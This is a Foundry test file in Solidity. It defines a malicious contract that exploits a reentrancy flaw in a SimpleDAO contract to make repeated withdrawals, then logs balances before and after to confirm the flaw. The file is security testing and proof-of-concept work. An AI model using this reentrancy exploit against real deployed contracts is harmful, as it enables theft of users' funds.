// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/simple_dao.sol";

contract MaliciousContract {
    SimpleDAO public dao;
    uint public attackCount;
    uint public amount;

    constructor(address _daoAddress) {
        dao = SimpleDAO(_daoAddress);
    }

    function donate() public payable {
        dao.donate{value: msg.value}(address(this));
    }

    function attack(uint _amount) public {
        amount = _amount;
        dao.withdraw(_amount);
    }

    receive() external payable {
        if (attackCount < 1 && address(dao).balance >= amount) {
            attackCount++;
            dao.withdraw(amount);
        }
    }
}

contract SimpleDAOTest is Test {
    SimpleDAO public dao;
    MaliciousContract public attacker;
    address public user = address(0x1);
    uint public initialBalance = 10 ether;

    function setUp() public {
        dao = new SimpleDAO();
        attacker = new MaliciousContract(address(dao));
        
        // Fund the DAO
        vm.deal(address(dao), initialBalance);
        
        // Fund user
        vm.deal(user, 1 ether);
    }

    function testReentrancyAttack() public {
        // User donates to attacker's contract
        vm.prank(user);
        attacker.donate{value: 1 ether}();

        console.log("--- BEFORE-Trigger State ---");
        uint beforeDaoBalance = address(dao).balance;
        uint beforeAttackerBalance = address(attacker).balance;
        uint beforeAttackerCredit = dao.credit(address(attacker));
        uint beforeWithdrawals = dao.totalWithdrawals();

        console.log("DAO Balance (ETH):\t\t", beforeDaoBalance);
        console.log("Attacker Balance (ETH):\t", beforeAttackerBalance);
        console.log("Attacker Credit (ETH):\t\t", beforeAttackerCredit);
        console.log("Total Withdrawals (ETH):\t", beforeWithdrawals);
        
        console.log("--- Trigger Attack ---");
        attacker.attack(1 ether);
        
        console.log("--- AFTER-Trigger State ---");
        uint afterDaoBalance = address(dao).balance;
        uint afterAttackerBalance = address(attacker).balance;
        uint afterAttackerCredit = dao.credit(address(attacker));
        uint afterWithdrawals = dao.totalWithdrawals();

        console.log("DAO Balance (ETH):\t\t", afterDaoBalance);
        console.log("Attacker Balance (ETH):\t", afterAttackerBalance);
        console.log("Attacker Credit (ETH):\t\t", afterAttackerCredit);
        console.log("Total Withdrawals (ETH):\t", afterWithdrawals);
        
        console.log("--- Differential Validation Results ---");
        bool anomalyFound = false;
        uint expectedLegitWithdrawal = 1 ether;

        // Check for excessive ETH extraction
        uint attackerBalanceDiff = afterAttackerBalance - beforeAttackerBalance;
        if (attackerBalanceDiff > expectedLegitWithdrawal) {
            console.log("[+] Anomaly: Attacker extracted excess ETH");
            anomalyFound = true;
        }

        // Check credit reduction - prevents underflow
        if (afterAttackerCredit != beforeAttackerCredit - expectedLegitWithdrawal) {
            console.log("[+] Anomaly: Credit reduction mismatch");
            anomalyFound = true;
        }

        // Validate total withdrawals
        uint withdrawalAmount = afterWithdrawals - beforeWithdrawals;
        if (withdrawalAmount != expectedLegitWithdrawal && withdrawalAmount > expectedLegitWithdrawal) {
            console.log("[+] Anomaly: Unexpected total withdrawal amount");
            anomalyFound = true;
        }

        // Final verdict
        if (anomalyFound) {
            console.log("Vulnerability Exists: Reentrancy attack allows multiple withdrawals through recursive calls when receiving ETH");
        } else {
            console.log("Vulnerability not Exist: All state changes match expected behavior after single withdrawal");
        }
    }
}